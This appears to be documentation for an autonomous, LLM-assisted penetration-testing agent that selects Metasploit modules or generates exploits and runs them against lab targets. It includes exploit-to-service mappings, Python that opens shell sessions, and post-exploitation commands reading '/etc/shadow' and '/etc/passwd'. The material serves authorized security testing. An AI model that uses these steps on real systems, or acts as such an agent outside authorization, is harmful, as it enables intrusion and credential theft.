# Metasploit Integration Guide

## Overview

The APFA agent now has **full Metasploit Framework integration**, enabling direct exploitation using professional MSF modules instead of only LLM-generated exploits.

## Features

### 🎯 Direct MSF Execution
- Execute Metasploit modules directly against targets
- Automatic session management
- Post-exploitation evidence collection

### 🧠 Intelligent Decision Making
The agent uses a **3-tier decision tree**:

1. **Cached Skills** (Fastest) - Previously successful exploits
2. **Metasploit Modules** (Most Reliable) - Professional exploit framework
   - Manual mappings (curated exploits)
   - Auto-discovered modules (learned from MSF database)
   - Real-time discovery (searches MSF on-demand)
3. **LLM Generation** (Most Flexible) - Custom exploit creation

### 📚 Learning System
- Successful MSF exploits are saved to skill library
- Auto-discovered modules progress through reliability levels:
  - `unverified` → `testing` → `good` → `excellent`
- Fuzzy matching for service version variations

---

## Prerequisites

### 1. Install Metasploit Framework

```bash
# Kali Linux (pre-installed)
apt update && apt install metasploit-framework

# Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### 2. Install Python RPC Client

```bash
pip install pymetasploit3
```

### 3. Start Metasploit RPC Server

```bash
# Start msfrpcd
msfrpcd -U msf -P msf123 -p 55553 -S -a 127.0.0.1
```

**Parameters:**
- `-U msf` - Username: msf
- `-P msf123` - Password: msf123
- `-p 55553` - Port: 55553
- `-S` - Disable SSL (for local connections)
- `-a 127.0.0.1` - Bind to localhost

---

## Configuration

### Enable MSF in `agent_config.yaml`

```yaml
metasploit:
  enabled: true                # Enable/disable MSF integration
  rpc_host: 127.0.0.1          # RPC server host
  rpc_port: 55553              # RPC server port
  rpc_ssl: false               # Use SSL (false for local)
  username: msf                # RPC username
  password: msf123             # RPC password
  auto_start: false            # Auto-start msfrpcd (if not running)
  module_map: config/msf_modules.yaml  # Module mappings file
  auto_discover: true          # Enable auto-discovery
  auto_discover_confidence_threshold: 0.25  # Min confidence for auto-discovered modules
  auto_save_successful: true   # Save successful auto-discoveries
```

### Manual Module Mappings

Edit `config/msf_modules.yaml` to add curated exploits:

```yaml
modules:
  "vsftpd 2.3.4":
    module: "exploit/unix/ftp/vsftpd_234_backdoor"
    cve: "CVE-2011-2523"
    ports: [21]
    payload: "cmd/unix/interact"
    reliability: "excellent"
    source: "manual"
  
  "samba 3.0.20":
    module: "exploit/multi/samba/usermap_script"
    cve: "CVE-2007-2447"
    ports: [139, 445]
    payload: "cmd/unix/bind_netcat"
    reliability: "excellent"
    source: "manual"
```

---

## Usage

### Basic Usage

```python
from apfa_agent.agent_mode import SmartTriageAgent

# Initialize agent (MSF auto-initialized if enabled)
agent = SmartTriageAgent(config_path="apfa_agent/config/agent_config.yaml")

# Run pentest (agent will use MSF when appropriate)
results = agent.run(classified_json_path="data/vulnerabilities.json")
```

### Direct MSF Execution

```python
from apfa_agent.msf_wrapper import MetasploitWrapper

# Initialize MSF wrapper
msf = MetasploitWrapper()

# Get module for service
module_info = msf.get_module_info("vsftpd 2.3.4")

if module_info:
    # Execute exploit
    result = msf.run_exploit(
        module_path=module_info['module'],
        options={
            'RHOSTS': '192.168.187.128',
            'RPORT': '21'
        },
        payload=module_info.get('payload', 'cmd/unix/interact')
    )
    
    if result['success']:
        print(f"Session opened: {result['session_id']}")
        
        # Collect evidence
        evidence = msf.interact_with_session(
            session_id=result['session_id'],
            commands=['whoami', 'id', 'uname -a']
        )
        
        for cmd, output in evidence.items():
            print(f"{cmd}: {output}")
```

---

## How It Works

### Execution Flow

```
1. Target Identified
   ↓
2. SmartTriageAgent._attack_target()
   ↓
3. ToolManager.get_exploit_method()
   ├→ Check cached skills
   ├→ Check MSF modules
   │   ├→ Manual mappings (exact)
   │   ├→ Manual mappings (fuzzy)
   │   ├→ Auto-discovered cache
   │   └→ Real-time MSF search
   └→ Fallback to LLM generation
   ↓
4a. If MSF selected:
    SmartTriageAgent._execute_msf_module()
    ├→ Configure module options
    ├→ Execute exploit
    ├→ Monitor for session
    ├→ Collect evidence
    └→ Save to skill library
    
4b. If LLM selected:
    UniversalLLMClient.generate_code()
    ├→ Tool calling (MSF intelligence)
    ├→ RAG context injection
    ├→ Generate Python exploit
    └→ CowboyExecutor.execute()
```

### Module Lookup Priority

```python
# 1. Exact match in manual mappings
"vsftpd 2.3.4" → exploit/unix/ftp/vsftpd_234_backdoor

# 2. Fuzzy match in manual mappings
"samba smbd 3.0.20-debian" → matches "samba 3.0.20"

# 3. Auto-discovered cache
"apache 2.4.49" → (if previously discovered and successful)

# 4. Real-time MSF database search
"proftpd 1.3.5" → searches MSF, ranks by confidence
```

### Auto-Discovery Algorithm

```python
# Extract product and version
"apache httpd 2.4.50" → product="apache httpd", version="2.4.50"

# Build search queries (specific → generic)
queries = [
    "apache httpd 2.4.50",  # Exact
    "apache httpd 2.4",     # Minor version
    "apache httpd 2",       # Major version
    "apache httpd"          # Product only
]

# Search MSF database for each query
for query in queries:
    results = msf.client.modules.search(query)
    
# Rank by confidence
for result in results:
    score = 0.0
    if version in result.name: score += 0.4
    if product in result.name: score += 0.2
    if rank < 10: score += 0.1
    
# Return best match if confidence >= threshold (0.25)
```

---

## Testing

### Run Integration Tests

```bash
# Full test suite
python test_msf_integration.py

# Individual tests
python -c "from test_msf_integration import test_msf_connection; test_msf_connection()"
```

### Test Coverage

1. **MSF RPC Connection** - Verifies msfrpcd connectivity
2. **Module Lookup** - Tests exact, fuzzy, and auto-discovery
3. **ToolManager Integration** - Validates decision tree
4. **Agent Initialization** - Confirms full agent setup
5. **Full Exploit Flow** - Simulates end-to-end execution

---

## Examples

### Example 1: Exploiting vsftpd 2.3.4

```bash
# 1. Start MSF RPC
msfrpcd -U msf -P msf123 -p 55553 -S -a 127.0.0.1

# 2. Run agent
python apfa_cli.py

# Agent output:
# [1/5] Attacking 192.168.187.128:21 (vsftpd)...
#   🔍 Checking target connectivity...
#   ✓ Target is reachable, proceeding with attack...
#   🔍 Determining best exploitation method...
#   🔫 Using manual MSF module: vsftpd 2.3.4
#     • Module: exploit/unix/ftp/vsftpd_234_backdoor
#     • Payload: cmd/unix/interact
#     • Target: 192.168.187.128:21
#     🔧 Loading exploit: exploit/unix/ftp/vsftpd_234_backdoor
#     ⚙️  Configuring options...
#        • RHOSTS = 192.168.187.128
#        • RPORT = 21
#     🚀 Executing with payload: cmd/unix/interact
#     ⏳ Waiting for session (max 10s)...
#     ✅ Session opened: 1
#     📁 Evidence saved: data/agent_results/evidence/msf_session_1_20251121_143022.txt
# ✅ SUCCESS!
```

### Example 2: Auto-Discovery

```bash
# Agent encounters unknown service
# [2/5] Attacking 192.168.187.128:8080 (apache httpd 2.4.49)...
#   🔍 Determining best exploitation method...
#   🔍 Auto-discovering: apache httpd 2.4.49
#     • Searching MSF database...
#     • Found: exploit/multi/http/apache_normalize_path_rce
#     • Confidence: 0.85
#   🔫 Using newly discovered MSF module: apache httpd 2.4.49
#   💾 Saved module: apache httpd 2.4.49 → exploit/multi/http/apache_normalize_path_rce
#      (1 successes, reliability: unverified)
```

---

## Evidence Collection

### Automatic Evidence Gathering

When MSF successfully exploits a target, the agent automatically:

1. **Runs enumeration commands**:
   - `whoami` - Current user
   - `id` - User ID and groups
   - `uname -a` - System information
   - `pwd` - Current directory
   - `hostname` - Machine name
   - `cat /etc/passwd | head -5` - User accounts

2. **Saves to file**:
   ```
   data/agent_results/evidence/msf_session_1_20251121_143022.txt
   ```

3. **Includes in report**:
   - Session ID
   - Target information
   - Command outputs
   - Timestamp

### Manual Evidence Collection

```python
from apfa_agent.msf_wrapper import MetasploitWrapper

msf = MetasploitWrapper()

# Collect custom evidence
evidence = msf.interact_with_session(
    session_id='1',
    commands=[
        'cat /etc/shadow',
        'netstat -tuln',
        'ps aux',
        'find / -perm -4000 2>/dev/null'
    ]
)
```

---

## Troubleshooting

### Issue: "Metasploit not connected"

**Solution**:
```bash
# Check if msfrpcd is running
ps aux | grep msfrpcd

# Start if not running
msfrpcd -U msf -P msf123 -p 55553 -S -a 127.0.0.1

# Verify connectivity
curl http://127.0.0.1:55553
```

### Issue: "No session created"

**Possible causes**:
1. **Target not vulnerable** - Service may be patched
2. **Firewall blocking** - Reverse payload can't connect back
3. **Wrong options** - LHOST might be incorrect for reverse shells
4. **Payload mismatch** - Try different payload

**Solution**:
```python
# Try bind shell instead of reverse
payload = 'cmd/unix/bind_netcat'  # Instead of cmd/unix/reverse

# Verify LHOST is correct
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
local_ip = s.getsockname()[0]
print(f"LHOST should be: {local_ip}")
```

### Issue: "Module not found"

**Solution**:
```bash
# Update Metasploit database
msfupdate

# Search module manually
msfconsole
msf6 > search vsftpd

# Add to config/msf_modules.yaml if found
```

---

## Best Practices

### 1. Always Start msfrpcd First

```bash
#!/bin/bash
# start_pentest.sh
msfrpcd -U msf -P msf123 -p 55553 -S -a 127.0.0.1 &
sleep 5
python apfa_cli.py
```

### 2. Use Appropriate Payloads

- **cmd/unix/interact** - Simple command shell (works best)
- **cmd/unix/reverse** - Reverse shell (needs LHOST)
- **cmd/unix/bind_netcat** - Bind shell (target listens)

### 3. Configure Allowed Targets

```yaml
safety:
  allowed_targets:
    - 192.168.187.128  # Metasploitable 2
    - 192.168.1.100    # Lab VM
```

### 4. Monitor MSF Sessions

```bash
# In another terminal
msfconsole
msf6 > sessions -l    # List active sessions
msf6 > sessions -i 1  # Interact with session 1
```

---

## Architecture Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                  SmartTriageAgent                           │
│  ┌──────────────────────────────────────────────────────┐  │
│  │              _attack_target()                        │  │
│  │  • Target identification                             │  │
│  │  • Exploit method selection                          │  │
│  │  • Execution routing                                 │  │
│  └───────────────────┬──────────────────────────────────┘  │
│                      │                                      │
│         ┌────────────┴────────────┐                        │
│         │   ToolManager           │                        │
│         │ get_exploit_method()    │                        │
│         │                         │                        │
│         │  1. Cached skills?      │                        │
│         │  2. MSF module?         │                        │
│         │  3. LLM generation      │                        │
│         └────────────┬────────────┘                        │
│                      │                                      │
│     ┌────────────────┼────────────────┐                    │
│     │                │                │                    │
│     ▼                ▼                ▼                    │
│ ┌────────┐   ┌──────────────┐   ┌─────────────┐          │
│ │ Cached │   │  MSFWrapper  │   │ LLMClient   │          │
│ │ Skills │   │              │   │ + RAG       │          │
│ └────────┘   │ • RPC client │   └─────────────┘          │
│              │ • Module DB  │                             │
│              │ • Execution  │                             │
│              │ • Evidence   │                             │
│              └──────────────┘                             │
└─────────────────────────────────────────────────────────────┘
                      │
                      ▼
            ┌─────────────────┐
            │  msfrpcd        │
            │  (127.0.0.1     │
            │   :55553)       │
            └─────────────────┘
                      │
                      ▼
            ┌─────────────────┐
            │  Metasploit     │
            │  Framework      │
            │  • Exploits     │
            │  • Payloads     │
            │  • Sessions     │
            └─────────────────┘
```

---

## Performance Comparison

| Method | Speed | Reliability | Learning |
|--------|-------|-------------|----------|
| **Cached Skills** | ⚡⚡⚡ | ⭐⭐⭐⭐ | ✅ |
| **MSF Manual** | ⚡⚡ | ⭐⭐⭐⭐⭐ | ✅ |
| **MSF Auto** | ⚡⚡ | ⭐⭐⭐⭐ | ✅ |
| **LLM Generation** | ⚡ | ⭐⭐⭐ | ✅ |

**Recommendation**: Enable all methods for optimal balance of speed, reliability, and adaptability.

---

## Future Enhancements

- [ ] Support for auxiliary modules (scanners, brute-force)
- [ ] Meterpreter session management
- [ ] Post-exploitation module chaining
- [ ] Multi-session orchestration
- [ ] Advanced payload customization
- [ ] Resource script generation

---

## Support

For issues or questions:
1. Check `data/agent_results/` for logs
2. Run `python test_msf_integration.py` for diagnostics
3. Verify msfrpcd is running: `ps aux | grep msfrpcd`
4. Check MSF version: `msfconsole --version`
